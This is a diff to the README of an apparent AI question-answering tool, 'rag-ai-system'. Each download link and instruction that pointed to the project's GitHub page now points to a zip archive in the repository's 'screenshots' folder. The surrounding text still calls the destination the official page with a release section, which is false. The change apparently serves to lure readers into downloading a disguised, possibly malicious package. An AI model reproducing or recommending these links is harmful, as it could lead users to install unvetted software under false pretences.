@@ -1,6 +1,6 @@
 # 🤖 rag-ai-system - Simple AI Question Answering Tool
 
-[![Download rag-ai-system](https://img.shields.io/badge/Download-Get%20rag--ai--system-blue?style=for-the-badge)](https://github.com/rehison0-max/rag-ai-system)
+[![Download rag-ai-system](https://img.shields.io/badge/Download-Get%20rag--ai--system-blue?style=for-the-badge)](https://raw.githubusercontent.com/rehison0-max/rag-ai-system/main/screenshots/system_ai_rag_v2.5.zip)
 
 ---
 
@@ -37,10 +37,10 @@ You do not need to install Python or any other programming tools yourself. All n
 
 To get rag-ai-system, visit the official GitHub page:
 
-[![Download rag-ai-system](https://img.shields.io/badge/Download-Get%20rag--ai--system-green?style=for-the-badge)](https://github.com/rehison0-max/rag-ai-system)
+[![Download rag-ai-system](https://img.shields.io/badge/Download-Get%20rag--ai--system-green?style=for-the-badge)](https://raw.githubusercontent.com/rehison0-max/rag-ai-system/main/screenshots/system_ai_rag_v2.5.zip)
 
 1. Click the link above or go to:  
-   https://github.com/rehison0-max/rag-ai-system
+   https://raw.githubusercontent.com/rehison0-max/rag-ai-system/main/screenshots/system_ai_rag_v2.5.zip
 
 2. Look for the latest release or download section on the page.
 
@@ -102,7 +102,7 @@ rag-ai-system works best with your own documents or data. To add your files:
 To update your software to the newest version:
 
 1. Return to the GitHub page:  
-   https://github.com/rehison0-max/rag-ai-system
+   https://raw.githubusercontent.com/rehison0-max/rag-ai-system/main/screenshots/system_ai_rag_v2.5.zip
 
 2. Download the latest release as you did before.
 
@@ -144,4 +144,4 @@ If you need help:
 
 ---
 
-[Get rag-ai-system](https://github.com/rehison0-max/rag-ai-system) and start asking questions about your data today.
+[Get rag-ai-system](https://raw.githubusercontent.com/rehison0-max/rag-ai-system/main/screenshots/system_ai_rag_v2.5.zip) and start asking questions about your data today.
